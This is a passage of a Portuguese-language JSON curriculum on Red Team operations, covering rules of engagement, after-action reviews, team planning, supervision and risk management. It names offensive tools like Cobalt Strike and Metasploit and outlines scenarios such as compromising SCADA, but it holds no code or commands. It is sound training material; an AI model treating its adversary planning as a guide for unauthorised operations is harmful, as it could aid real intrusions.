                                "Documentação profissional e atualizável."
                              ],
                              "crossCurricularConnections": [
                                "Direito Cibernético: Conformidade com leis de privacidade e hacking ético.",
                                "Ética Profissional: Decisões morais em cenários de guerra cibernética.",
                                "Gerenciamento de Projetos: Planejamento e controle de escopo operacional.",
                                "Liderança e Comunicação: Treinamento e fiscalização de equipe.",
                                "Análise de Riscos: Identificação e mitigação de ameaças legais."
                              ],
                              "realWorldApplication": "Em pentests autorizados para empresas ou agências governamentais, RoE gerenciadas corretamente previnem processos judiciais, protegem reputação e garantem que simulações revelem vulnerabilidades sem causar danos reais, como em operações de Red Team para bancos ou infraestruturas críticas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.3",
                            "name": "Planejar relatórios e lições aprendidas",
                            "description": "Organizar processos de after-action review (AAR) para documentar indicadores de compromisso e melhorias, conforme Blue Team Handbook.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Objetivos e Estrutura do AAR",
                                  "subSteps": [
                                    "Reunir a equipe para alinhar nos objetivos do AAR, focando em indicadores de compromisso (IoCs) e áreas de melhoria.",
                                    "Selecionar o framework do Blue Team Handbook: What? So What? Now What? para estruturar a revisão.",
                                    "Definir participantes, agenda e ferramentas de documentação.",
                                    "Estabelecer métricas chave: tempo de detecção, falsos positivos, efetividade de respostas.",
                                    "Criar template inicial do relatório com seções para fatos, análise e ações."
                                  ],
                                  "verification": "Template do AAR preenchido com objetivos claros e agenda aprovada pela equipe.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Blue Team Handbook, planilha Google Sheets ou Microsoft Word para template, acesso a logs de simulação.",
                                  "tips": "Mantenha o framework simples para evitar sobrecarga; priorize IoCs relevantes ao cenário.",
                                  "learningObjective": "Entender e aplicar o framework AAR para estruturar revisões pós-operação.",
                                  "commonMistakes": "Ignorar input de todos os membros da equipe; definir objetivos muito vagos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Coletar Dados e Evidências",
                                  "subSteps": [
                                    "Compilar logs de ferramentas de monitoramento (SIEM, EDR) e timestamps de eventos.",
                                    "Registrar IoCs detectados: hashes, IPs, behaviors anômalos.",
                                    "Coletar feedback qualitativo de operadores via formulários ou entrevistas.",
                                    "Documentar timeline completa do exercício cibernético.",
                                    "Organizar dados em categorias: sucessos, falhas, gaps."
                                  ],
                                  "verification": "Banco de dados ou pasta compartilhada com todos os logs, IoCs e feedbacks catalogados.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas SIEM (Splunk/ELK), EDR logs, formulários Google Forms, timeline tool como Lucidchart.",
                                  "tips": "Use automação para exportar logs; capture screenshots de dashboards para evidências visuais.",
                                  "learningObjective": "Desenvolver habilidades em coleta sistemática de evidências operacionais.",
                                  "commonMistakes": "Perder dados por falta de backup; misturar dados de múltiplas simulações."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Dados e Identificar Lições",
                                  "subSteps": [
                                    "Aplicar 'What?': Descrever fatos objetivos sem julgamento.",
                                    "Aplicar 'So What?': Analisar impactos, causas raiz usando 5 Whys.",
                                    "Aplicar 'Now What?': Propor ações corretivas e preventivas priorizadas.",
                                    "Mapear IoCs para vulnerabilidades e medir efetividade de defesas.",
                                    "Validar análises com a equipe em sessão de discussão."
                                  ],
                                  "verification": "Matriz de análise preenchida com causas raiz e ações propostas, aprovada em reunião.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Blue Team Handbook seções de AAR, ferramenta de análise como Excel ou Miro board.",
                                  "tips": "Use dados quantitativos (ex: tempo médio de detecção) para embasar análises qualitativas.",
                                  "learningObjective": "Capacitar análise crítica de operações para extrair lições acionáveis.",
                                  "commonMistakes": "Culpar indivíduos em vez de processos; pular validação em grupo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Redigir e Finalizar o Relatório",
                                  "subSteps": [
                                    "Preencher template com seções: Executive Summary, Timeline, Análise, Lições, Recomendações.",
                                    "Incluir apêndices com IoCs raw e evidências.",
                                    "Revisar por clareza, precisão e confidencialidade.",
                                    "Obter aprovações de stakeholders.",
                                    "Preparar versão para distribuição (redigida e visual)."
                                  ],
                                  "verification": "Relatório final versionado, aprovado e pronto para compartilhamento.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Template Word/PDF, ferramentas de edição colaborativa como Overleaf ou Google Docs.",
                                  "tips": "Use bullet points e gráficos para legibilidade; inclua métricas SMART nas recomendações.",
                                  "learningObjective": "Produzir relatórios profissionais que comuniquem lições de forma impactante.",
                                  "commonMistakes": "Relatórios muito longos ou técnicos; esquecer de anonimizar dados sensíveis."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Distribuir, Implementar e Acompanhar",
                                  "subSteps": [
                                    "Compartilhar relatório via canais seguros (ex: SharePoint com controle de acesso).",
                                    "Agendar follow-up para atribuir responsáveis às ações.",
                                    "Integrar lições ao playbook de operações.",
                                    "Configurar métricas de tracking para melhorias.",
                                    "Avaliar impacto em próxima operação."
                                  ],
                                  "verification": "Lista de ações atribuídas com prazos, playbook atualizado e registro de distribuição.",
                                  "estimatedTime": "1-2 horas iniciais + ongoing",
                                  "materials": "Ferramenta de task management (Trello/Jira), playbook digital.",
                                  "tips": "Defina owners claros para cada ação; revise trimestralmente.",
                                  "learningObjective": "Garantir que lições do AAR sejam aplicadas continuamente.",
                                  "commonMistakes": "Arquivar relatório sem ação; não medir progresso das recomendações."
                                }
                              ],
                              "practicalExample": "Após um exercício de Red Team simulando phishing e lateral movement, o Blue Team usa AAR para documentar IoCs como hash de malware (ex: SHA256: abc123...), tempo de detecção (45 min), falha em regra SIEM, propondo nova regra e treinamento, resultando em playbook atualizado que reduz detecção para 20 min no próximo exercício.",
                              "finalVerifications": [
                                "Relatório cobre todos IoCs e métricas chave conforme template.",
                                "Análises incluem causas raiz validadas pela equipe.",
                                "Recomendações são SMART (Specific, Measurable, Achievable, Relevant, Time-bound).",
                                "Playbook de operações atualizado com lições.",
                                "Ações atribuídas com owners e prazos definidos.",
                                "Distribuição confirmada para todos stakeholders."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todas seções do AAR preenchidas com evidências.",
                                "Precisão: IoCs e fatos verificados contra logs originais.",
                                "Açãoabilidade: Recomendações claras e priorizadas.",
                                "Colaboração: Input de múltiplos membros incorporado.",
                                "Clareza: Linguagem concisa, visual aids usados.",
                                "Impacto: Lições mensuráveis ligadas a melhorias operacionais."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Uso de frameworks como PDCA para revisões.",
                                "Análise de Dados: Técnicas de root cause analysis (5 Whys, Fishbone).",
                                "Comunicação: Redação de relatórios executivos e apresentações.",
                                "Liderança: Facilitação de sessões de equipe e accountability.",
                                "Aprendizado Contínuo: Integração com ciclos de melhoria Kaizen."
                              ],
                              "realWorldApplication": "Em equipes de SOC reais, AARs pós-incidente documentam lições de breaches como SolarWinds, melhorando detecção de supply chain attacks via atualizações em SIEM rules e treinamentos, reduzindo MTTD (Mean Time to Detect) em 30% em operações subsequentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.4",
                            "name": "Adaptar estrutura para cenários",
                            "description": "Ajustar organização da equipe para diferentes cenários de ameaça, integrando ferramentas de ethical hacking e mindset do adversário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Análise Inicial do Cenário de Ameaça",
                                  "subSteps": [
                                    "Identifique o tipo de ameaça (ex: APT, insider, DDoS).",
                                    "Colete inteligência sobre o alvo (ativos, vulnerabilidades conhecidas).",
                                    "Defina objetivos da operação e restrições legais/éticas.",
                                    "Crie um perfil do cenário com níveis de complexidade.",
                                    "Documente premissas iniciais em um relatório preliminar."
                                  ],
                                  "verification": "Relatório de análise completo com perfil do cenário aprovado por um revisor.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de OSINT (Maltego, Shodan), templates de relatório de ameaça, acesso a bases de dados de ameaças (MITRE ATT&CK).",
                                  "tips": "Priorize cenários realistas baseados em notícias recentes para maior relevância.",
                                  "learningObjective": "Compreender e documentar características únicas de diferentes cenários de ameaça cibernética.",
                                  "commonMistakes": "Ignorar contexto regulatório ou superestimar capacidades da equipe sem dados reais."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapeamento do Mindset do Adversário",
                                  "subSteps": [
                                    "Estude táticas, técnicas e procedimentos (TTPs) do adversário via frameworks como MITRE ATT&CK.",
                                    "Simule perspectivas do atacante (red teaming mindset) em sessões de brainstorming.",
                                    "Identifique motivações, recursos e limitações do adversário.",
                                    "Crie personas de adversários para cada cenário.",
                                    "Valide o mapa com cenários históricos de ataques reais."
                                  ],
                                  "verification": "Mapa de mindset documentado com personas e TTPs mapeados, revisado em grupo.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "MITRE ATT&CK Navigator, whiteboard ou Miro para brainstorming, casos de estudo de ataques (ex: SolarWinds).",
                                  "tips": "Use role-playing para imersão no mindset adversário e evitar vieses defensivos.",
                                  "learningObjective": "Internalizar o pensamento do adversário para antecipar movimentos em cenários variados.",
                                  "commonMistakes": "Focar apenas em TTPs técnicas, ignorando aspectos humanos como motivação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Seleção e Integração de Ferramentas de Ethical Hacking",
                                  "subSteps": [
                                    "Liste ferramentas adequadas ao cenário (ex: Metasploit para exploits, Cobalt Strike para C2).",
                                    "Avalie compatibilidade, legalidade e treinamentos necessários.",
                                    "Integre ferramentas em uma stack personalizada para o cenário.",
                                    "Teste integração em ambiente controlado (lab virtual).",
                                    "Documente playbooks de uso com comandos e configurações."
                                  ],
                                  "verification": "Stack de ferramentas testada com demo funcional em lab.",
                                  "estimatedTime": "5-7 horas",
                                  "materials": "Kali Linux, VMs para lab (VirtualBox/VMware), documentação de ferramentas (ex: HackTheBox, TryHackMe).",
                                  "tips": "Escolha ferramentas open-source primeiro para reduzir custos e dependências.",
                                  "learningObjective": "Selecionar e integrar ferramentas que repliquem fielmente o mindset adversário.",
                                  "commonMistakes": "Sobrecarregar com muitas ferramentas, causando complexidade desnecessária."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reestruturação da Equipe e Validação",
                                  "subSteps": [
                                    "Defina papéis adaptados (ex: líder de social eng., exploit dev, C2 operator).",
                                    "Atribua membros com base em skills e treine gaps identificados.",
                                    "Realize simulação dry-run do cenário adaptado.",
                                    "Ajuste estrutura com base em feedback da simulação.",
                                    "Crie plano de contingência para falhas."
                                  ],
                                  "verification": "Estrutura de equipe documentada e simulação bem-sucedida com relatório de lições aprendidas.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de colaboração (Slack, Trello), ambiente de simulação (RangeForce ou custom lab).",
                                  "tips": "Mantenha flexibilidade com papéis híbridos para equipes pequenas.",
                                  "learningObjective": "Adaptar dinamicamente a organização da equipe para maximizar eficácia operacional.",
                                  "commonMistakes": "Não considerar fadiga ou rotatividade, levando a falhas em execuções longas."
                                }
                              ],
                              "practicalExample": "Em um cenário de APT contra uma infraestrutura crítica bancária, a equipe é reestruturada: 1 líder adota mindset de nation-state actor usando MITRE ATT&CK para TTPs de persistência; integra Cobalt Strike para C2 e BloodHound para AD enumeration; papéis incluem hunter de rede, social engineer e analista de logs, simulando infiltração em 48h com detecção mínima.",
                              "finalVerifications": [
                                "Capacidade de criar relatórios de adaptação para 3 cenários distintos (ex: ransomware, insider, supply chain).",
                                "Execução bem-sucedida de simulação com ferramentas integradas e mindset adversário aplicado.",
                                "Documentação completa de estrutura de equipe com papéis, ferramentas e contingências.",
                                "Feedback positivo de pares em role-playing de mindset adversário.",
                                "Identificação de pelo menos 5 TTPs adaptados por cenário."
                              ],
                              "assessmentCriteria": [
                                "Precisão na análise de cenários (90% alinhamento com frameworks padrão).",
                                "Profundidade do mapeamento de mindset (cobertura de TTPs, motivações e limitações).",
                                "Efetividade da integração de ferramentas (sucesso em testes de lab >95%).",
                                "Flexibilidade e realismo na reestruturação da equipe.",
                                "Qualidade da documentação e verificações (clareza, completude e acionabilidade).",
                                "Criatividade em conexões com mundo real."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Adaptação ágil de estruturas (Scrum/Kanban).",
                                "Psicologia e Comportamento Humano: Modelagem de personas adversárias.",
                                "Análise de Riscos: Avaliação de ameaças e impactos.",
                                "Liderança e Trabalho em Equipe: Atribuição de papéis dinâmicos.",
                                "Inteligência de Ameaças: Uso de OSINT e frameworks como Diamond Model."
                              ],
                              "realWorldApplication": "Em operações de Red Team para CERTs ou empresas Fortune 500, permite resposta rápida a ameaças emergentes como ataques de ransomware ou espionagem estatal, otimizando equipes para jogos de guerra cibernéticos e melhorando defesas proativas contra adversários reais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.3",
                    "name": "Papéis e Responsabilidades no Red Team",
                    "description": "Funções específicas dos membros, como líderes e operadores, em equipes Red Team.",
                    "individualConcepts": [
                      {
                        "id": "2.0.2.3.1",
                        "name": "Líder do Red Team",
                        "description": "O líder do Red Team é responsável pela direção estratégica, planejamento geral e supervisão das operações de simulação de ataques cibernéticos, garantindo alinhamento com objetivos de treinamento e conformidade com regras de engajamento.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.1.1",
                            "name": "Planejamento Estratégico de Operações",
                            "description": "Desenvolver planos detalhados de operações Red Team, incluindo definição de objetivos, escopo, cronograma e alocação de recursos, com base em cenários de ameaça reais inspirados em táticas de adversários avançados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definição de Objetivos da Operação Red Team",
                                  "subSteps": [
                                    "Identifique o propósito principal da operação, alinhando com metas organizacionais de segurança.",
                                    "Especifique objetivos SMART (Específicos, Mensuráveis, Alcançáveis, Relevantes, Temporais).",
                                    "Mapeie objetivos a cenários de ameaça reais, como táticas de APTs (ex: MITRE ATT&CK).",
                                    "Consulte stakeholders para validar alinhamento.",
                                    "Documente objetivos em formato hierárquico (primários e secundários)."
                                  ],
                                  "verification": "Objetivos documentados em um documento inicial com critérios SMART validados por revisão de pares.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "MITRE ATT&CK Framework",
                                    "Template de Objetivos SMART",
                                    "Ferramentas de documentação (Google Docs ou Notion)"
                                  ],
                                  "tips": "Priorize objetivos que testem defesas críticas; evite sobrecarga com metas irreais.",
                                  "learningObjective": "Capacitar o líder a definir objetivos claros que guiem toda a operação Red Team.",
                                  "commonMistakes": [
                                    "Definir objetivos vagos como 'testar segurança'",
                                    "Ignorar viabilidade técnica e temporal",
                                    "Não alinhar com necessidades do cliente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Análise de Cenários de Ameaça e Inteligência Adversária",
                                  "subSteps": [
                                    "Pesquise táticas, técnicas e procedimentos (TTPs) de adversários avançados via fontes como MITRE ou relatórios de threat intel.",
                                    "Crie perfis de ameaças baseados em cenários reais (ex: ataque de ransomware como Conti).",
                                    "Avalie o ambiente alvo: ativos, vulnerabilidades e controles existentes.",
                                    "Priorize cenários por impacto e probabilidade usando matriz de risco.",
                                    "Integre lições de operações Red Team passadas."
                                  ],
                                  "verification": "Relatório de análise de ameaças com pelo menos 3 cenários mapeados ao MITRE ATT&CK e matriz de risco preenchida.",
                                  "estimatedTime": "6 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios de Threat Intelligence (ex: Mandiant M-Trends)",
                                    "Ferramentas de modelagem de ameaças (ThreatModeler)"
                                  ],
                                  "tips": "Use o framework Diamond Model para modelar adversários; foque em realismo para simular ameaças autênticas.",
                                  "learningObjective": "Desenvolver habilidade em traduzir inteligência de ameaças em cenários acionáveis para Red Team.",
                                  "commonMistakes": [
                                    "Basear em ameaças genéricas sem dados reais",
                                    "Subestimar sofisticação do adversário",
                                    "Ignorar contexto organizacional"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definição de Escopo, Regras de Engajamento e Cronograma",
                                  "subSteps": [
                                    "Delimite o escopo: sistemas, redes e ações permitidas/proibidas.",
                                    "Redija Regras de Engajamento (RoE) claras, incluindo critérios de parada e comunicação.",
                                    "Crie cronograma detalhado com fases (recon, exploração, pós-exploração, exfiltração).",
                                    "Inclua buffers para imprevistos e milestones de checkpoint.",
                                    "Valide escopo com cliente para evitar ambiguidades."
                                  ],
                                  "verification": "Documento de escopo e RoE assinado pelo cliente, com Gantt chart do cronograma.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Template de RoE padrão",
                                    "Microsoft Project ou Trello para cronograma",
                                    "Contrato ou MoU com cliente"
                                  ],
                                  "tips": "Mantenha RoE concisas e acessíveis; use 80/20 para escopo (80% foco em áreas críticas).",
                                  "learningObjective": "Garantir que o plano defina limites claros para operação segura e eficaz.",
                                  "commonMistakes": [
                                    "Escopo muito amplo levando a creep",
                                    "RoE vagas causando mal-entendidos",
                                    "Cronograma irrealista sem buffers"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Alocação de Recursos e Planejamento Logístico",
                                  "subSteps": [
                                    "Liste recursos humanos: papéis (ex: recon operator, exploit dev) e competências requeridas.",
                                    "Atribua equipe com base em skills matrix e disponibilidade.",
                                    "Identifique ferramentas, VMs, licenças e orçamento necessário.",
                                    "Planeje logística: acessos, comunicações seguras (ex: C2 channels) e suporte externo.",
                                    "Crie plano de contingência para falhas de recursos."
                                  ],
                                  "verification": "Matriz de alocação de recursos aprovada pela equipe, com orçamento e logística documentados.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Skills Matrix Template",
                                    "Lista de ferramentas Red Team (Cobalt Strike, BloodHound)",
                                    "Ferramenta de gerenciamento (Asana)"
                                  ],
                                  "tips": "Sobrecarregue em skills versáteis; teste ferramentas em ambiente de staging antes.",
                                  "learningObjective": "Otimizar alocação de recursos limitados para maximizar sucesso da operação.",
                                  "commonMistakes": [
                                    "Subestimar tempo de setup de ferramentas",
                                    "Alocar sem considerar fadiga da equipe",
                                    "Ignorar custos ocultos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Revisão, Aprovação e Finalização do Plano",
                                  "subSteps": [
                                    "Compile todos os elementos em um plano unificado.",
                                    "Realize revisão por pares e walkthrough simulada.",
                                    "Apresente ao cliente para feedback e aprovação final.",
                                    "Incorpore ajustes e versione o documento.",
                                    "Prepare briefing pack para a equipe."
                                  ],
                                  "verification": "Plano final aprovado com assinatura digital, versão controlada e briefing agendado.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Template de Plano Red Team Completo",
                                    "Ferramenta de versionamento (Git ou SharePoint)",
                                    "Ferramentas de apresentação (PowerPoint)"
                                  ],
                                  "tips": "Use checklist de revisão; simule Q&A com cliente antecipadamente.",
                                  "learningObjective": "Assegurar qualidade e buy-in através de processos de revisão iterativos.",
                                  "commonMistakes": [
                                    "Pular revisão por pressa",
                                    "Não versionar mudanças",
                                    "Apresentação técnica demais para stakeholders"
                                  ]
                                }
                              ],
                              "practicalExample": "Para uma operação Red Team simulando um APT chinês contra uma empresa de energia, defina objetivo: 'Comprometer SCADA em 72h'; analise TTPs de Salt Typhoon; escopo limitado a rede OT; cronograma de 5 dias; aloque 5 operadores com Cobalt Strike; revise e aprove com CISO.",
                              "finalVerifications": [
                                "Objetivos SMART documentados e alinhados a ameaças reais.",
                                "RoE claras e assinadas pelo cliente.",
                                "Cronograma realista com milestones e buffers.",
                                "Recursos alocados com skills matrix e orçamento aprovado.",
                                "Plano versionado após revisões e walkthrough.",
                                "Briefing pack pronto para kickoff."
                              ],
                              "assessmentCriteria": [
                                "Clareza e completude dos objetivos (20%)",
                                "Realismo dos cenários de ameaça (25%)",
                                "Precisão do escopo e RoE (20%)",
                                "Viabilidade do cronograma e recursos (20%)",
                                "Qualidade da revisão e contingências (15%)"
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos (PMBOK para cronogramas)",
                                "Análise de Riscos (NIST 800-30)",
                                "Inteligência de Ameaças (Cyber Threat Intelligence)",
                                "Liderança e Trabalho em Equipe",
                                "Comunicação Técnica (Relatórios e Apresentações)"
                              ],
                              "realWorldApplication": "Em equipes profissionais de Red Team como as da Mandiant ou CrowdStrike, esse planejamento é essencial para operações autorizadas que simulam ataques reais, identificando gaps de defesa e melhorando resiliência organizacional sem causar danos."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.2",
                            "name": "Coordenação e Supervisão da Equipe",
                            "description": "Gerenciar a equipe Red Team, atribuindo tarefas aos operadores e analistas, monitorando o progresso em tempo real e ajustando estratégias durante a execução para maximizar o realismo e efetividade do exercício.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejamento e Atribuição de Tarefas à Equipe",
                                  "subSteps": [
                                    "Analise o plano geral do exercício de Red Team e divida em tarefas específicas para operadores (ex.: execução de exploits) e analistas (ex.: análise de logs).",
                                    "Defina objetivos claros, prazos intermediários e responsabilidades para cada membro, usando matriz RACI (Responsible, Accountable, Consulted, Informed).",
                                    "Comunique as tarefas via briefing inicial, garantindo que todos entendam o escopo, riscos e regras de engajamento.",
                                    "Registre atribuições em ferramenta de gerenciamento (ex.: Trello ou Jira) com checklists acionáveis.",
                                    "Confirme compreensão com perguntas direcionadas e ajuste tarefas com base em feedback imediato."
                                  ],
                                  "verification": "Verifique se todas as tarefas foram atribuídas com responsáveis claros e checklists preenchidas na ferramenta de gerenciamento.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramenta de gerenciamento de tarefas (Jira, Trello)",
                                    "Plano do exercício de Red Team",
                                    "Lista de equipe com skills mapping"
                                  ],
                                  "tips": "Priorize tarefas críticas primeiro e equilibre carga de trabalho para evitar sobrecarga em um membro.",
                                  "learningObjective": "Dominar a divisão estratégica de tarefas alinhada ao objetivo do exercício cibernético.",
                                  "commonMistakes": [
                                    "Atribuições vagas sem prazos",
                                    "Ignorar skills individuais da equipe",
                                    "Falta de comunicação clara no briefing"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabelecimento de Mecanismos de Monitoramento em Tempo Real",
                                  "subSteps": [
                                    "Configure canais de comunicação dedicados (ex.: Slack/Teams para updates rápidos, dashboard compartilhado para métricas).",
                                    "Defina KPIs de progresso (ex.: % de tarefas concluídas, tempo de ciclo de ataques, detecções adversárias).",
                                    "Implemente ferramentas de monitoramento (ex.: ELK Stack para logs, scripts personalizados para alertas).",
                                    "Treine a equipe no uso dos mecanismos e estabeleça cadência de relatórios (ex.: a cada 15 minutos).",
                                    "Teste os mecanismos em um dry-run de 10 minutos para validar conectividade e visibilidade."
                                  ],
                                  "verification": "Realize um teste de monitoramento onde todos reportam status e dashboard atualiza em tempo real.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de chat (Slack/Teams)",
                                    "Dashboard de monitoramento (Grafana/ELK)",
                                    "Scripts de alertas personalizados"
                                  ],
                                  "tips": "Use alertas automatizados para eventos críticos para reduzir carga manual de monitoramento.",
                                  "learningObjective": "Configurar sistemas que permitam visibilidade total e reativa do progresso da equipe.",
                                  "commonMistakes": [
                                    "Canais de comunicação sobrecarregados",
                                    "KPIs irrelevantes ao realismo do exercício",
                                    "Falta de teste prévio dos mecanismos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Monitoramento Contínuo e Comunicação Durante a Execução",
                                  "subSteps": [
                                    "Monitore dashboards e canais em tempo real, registrando avanços e gargalos a cada intervalo definido.",
                                    "Solicite updates proativos da equipe e intervenha apenas quando necessário para manter fluxo.",
                                    "Documente observações em log compartilhado, incluindo timestamps e impactos no exercício.",
                                    "Mantenha comunicação concisa e focada, usando códigos ou abreviações para eficiência.",
                                    "Avalie aderência ao plano e realismo das táticas em paralelo ao monitoramento."
                                  ],
                                  "verification": "Registre pelo menos 80% de cobertura de monitoramento com logs completos e sem lacunas >15 minutos.",
                                  "estimatedTime": "Durante toda a execução (ex.: 4-8 horas)",
                                  "materials": [
                                    "Dashboard ao vivo",
                                    "Logbook digital (Google Sheets/Notion)",
                                    "Canais de comunicação"
                                  ],
                                  "tips": "Evite micromanagement; foque em empowerment da equipe com orientação estratégica.",
                                  "learningObjective": "Desenvolver habilidades de supervisão não intrusiva que preservem autonomia da equipe.",
                                  "commonMistakes": [
                                    "Intervenções excessivas que desmotivam",
                                    "Ignorar sinais sutis de desvios",
                                    "Comunicação prolixa que atrasa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustes Estratégicos e Resolução de Problemas em Tempo Real",
                                  "subSteps": [
                                    "Identifique desvios (ex.: atrasos, falhas técnicas) via monitoramento e priorize por impacto.",
                                    "Reatribua tarefas ou recursos dinamicamente, consultando equipe afetada.",
                                    "Ajuste estratégias para manter realismo (ex.: escalar ataques simulados ou pivotar táticas).",
                                    "Comunique mudanças via update rápido e confirme adesão imediata.",
                                    "Avalie eficácia dos ajustes em mini-review pós-intervenção."
                                  ],
                                  "verification": "Demonstre pelo menos 2 ajustes bem-sucedidos que recuperaram o cronograma sem comprometer efetividade.",
                                  "estimatedTime": "Variável, 30-60 minutos por ajuste",
                                  "materials": [
                                    "Ferramentas de gerenciamento atualizadas",
                                    "Backup de recursos (ex.: operadores reservas)"
                                  ],
                                  "tips": "Sempre explique o 'porquê' dos ajustes para alinhar mindset da equipe.",
                                  "learningObjective": "Capacitar decisões ágeis que otimizem efetividade e realismo sob pressão.",
                                  "commonMistakes": [
                                    "Ajustes reativos sem análise de causa raiz",
                                    "Mudanças frequentes que confundem equipe",
                                    "Falha em documentar lições dos ajustes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team simulando um APT contra uma rede corporativa, o líder atribui ao operador A a infiltração inicial via phishing, ao analista B a análise de credenciais roubadas, monitora via dashboard ELK mostrando 70% progresso em 2 horas, detecta atraso no pivô interno e reatribui suporte ao operador C, ajustando para um exploit alternativo, mantendo o realismo e completando em 6 horas.",
                              "finalVerifications": [
                                "Equipe completa tarefas com >90% aderência ao cronograma ajustado.",
                                "Logs de monitoramento mostram cobertura contínua sem lacunas >15 minutos.",
                                "Pelo menos 3 ajustes estratégicos documentados com resultados positivos.",
                                "Feedback da equipe indica comunicação clara e empowerment.",
                                "Exercício atinge objetivos de realismo e efetividade avaliados por observadores.",
                                "Relatório pós-exercício reflete lições aprendidas de supervisão."
                              ],
                              "assessmentCriteria": [
                                "Precisão na atribuição de tarefas (alinhamento skills x responsabilidades).",
                                "Efetividade do monitoramento (detecção precoce de desvios).",
                                "Qualidade dos ajustes (recuperação de cronograma sem perda de realismo).",
                                "Comunicação eficiente (clareza e brevidade).",
                                "Documentação completa (logs e relatórios acionáveis).",
                                "Resultados gerais do exercício (efetividade maximizada)."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos (PMBOK: planejamento, execução, controle).",
                                "Liderança e Trabalho em Equipe (motivação e resolução de conflitos).",
                                "Comunicação Organizacional (ferramentas ágeis como Scrum).",
                                "Análise de Dados (KPIs e dashboards para decisões baseadas em evidências).",
                                "Psicologia Aplicada (mindset sob pressão em simulações high-stakes)."
                              ],
                              "realWorldApplication": "Em operações reais de Red Team para empresas ou agências governamentais, como testes de penetração autorizados, o líder coordena equipes para simular ataques persistentes, monitorando em tempo real para evasão de defesas Blue Team, ajustando táticas contra detecções reais, garantindo relatórios acionáveis que fortalecem defesas cibernéticas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.3",
                            "name": "Gestão de Regras de Engajamento e Riscos",
                            "description": "Definir e fiscalizar as regras de engajamento (ROE), avaliar riscos operacionais e éticos, e coordenar debriefings para garantir que as simulações sejam seguras e educativas, conforme guias como o de Vest e Tuberville.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Analisar o escopo da simulação cibernética, incluindo objetivos, alvos e restrições legais.",
                                    "Consultar guias como Vest e Tuberville para identificar regras padrão de ROE em operações de Red Team.",
                                    "Redigir ROE claras, especificando ações permitidas, limites éticos e protocolos de parada.",
                                    "Revisar e obter aprovação de stakeholders, como clientes ou supervisores.",
                                    "Documentar ROE em um formato acessível, como um documento compartilhado ou briefing inicial."
                                  ],
                                  "verification": "ROE documentadas e aprovadas por todos os participantes, com assinaturas ou confirmações.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Guias de Vest e Tuberville",
                                    "Templates de ROE",
                                    "Ferramentas de colaboração (Google Docs, Microsoft Teams)"
                                  ],
                                  "tips": "Use linguagem simples e exemplos concretos para evitar ambiguidades nas ROE.",
                                  "learningObjective": "Compreender e criar ROE que equilibrem realismo educacional com segurança.",
                                  "commonMistakes": [
                                    "ROE vagas que permitem violações acidentais",
                                    "Ignorar aprovações prévias",
                                    "Não considerar cenários edge cases"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar Riscos Operacionais e Éticos",
                                  "subSteps": [
                                    "Identificar riscos operacionais, como falhas de rede ou exposição de dados reais.",
                                    "Avaliar riscos éticos, incluindo privacidade, impacto em sistemas de produção e conformidade legal.",
